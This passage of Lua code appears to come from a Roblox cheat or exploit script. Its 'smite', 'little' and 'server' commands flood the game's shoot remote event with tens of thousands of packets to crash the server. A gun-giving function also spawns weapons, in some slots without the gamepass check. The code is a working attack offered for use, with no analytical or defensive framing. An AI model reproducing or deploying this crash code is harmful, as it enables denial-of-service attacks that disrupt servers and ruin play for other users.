if Cmd == "smite" then

local Packets = {}

CrashSmite = true

Run.Stepped:Connect(function()

for ReplicateCrash = 1,1000 do

if CrashSmite then

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

for SendToServer = 1,55555 do
Packets[SendToServer] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
}
end

for ReplicateSends = 1,2 do
ShootEvent:FireServer(Packets,Gun)
end

end

end

end)

wait()

CrashSmite = false

NewCmdLabel("Crash Smite.")

end

if Cmd == "little" then

local Packets = {}

CrashLittle = true

Run.Stepped:Connect(function()

coroutine.resume(coroutine.create(function()

if CrashLittle then

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

for SendToServer = 1,55555 do
coroutine.resume(coroutine.create(function()
Packets[SendToServer] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
}
end))
end

coroutine.resume(coroutine.create(function()
ShootEvent:FireServer(Packets,Gun)
end))

end

end))

end)

wait()

CrashLittle = false

NewCmdLabel("Crash Little.")

end

if Cmd == "server" then

local Packets = {}

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

for i = 1,1000 do
ShootEvent:FireServer(Packets,Gun)
end

NewCmdLabel("Crash Server.")

end

end

function Guns(Slot)

if Slot == "slot1" then

if CheckGamePass then
ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["M4A1"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["AK-47"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
end

NewCmdLabel("Guns Slot1.")

end

if Slot == "slot2" then

if CheckGamePass then
ItemHandler:InvokeServer(ItemGiver["M4A1"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["AK-47"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
else
ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["AK-47"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
end

NewCmdLabel("Guns Slot2.")

end

if Slot == "slot3" then

if CheckGamePass then
ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["AK-47"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["M4A1"].ITEMPICKUP)
else
ItemHandler:InvokeServer(ItemGiver["Remington 870"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)
ItemHandler:InvokeServer(ItemGiver["AK-47"].ITEMPICKUP)
end

NewCmdLabel("Guns Slot3.")

end

if Slot == "slot4" then

if CheckGamePass then
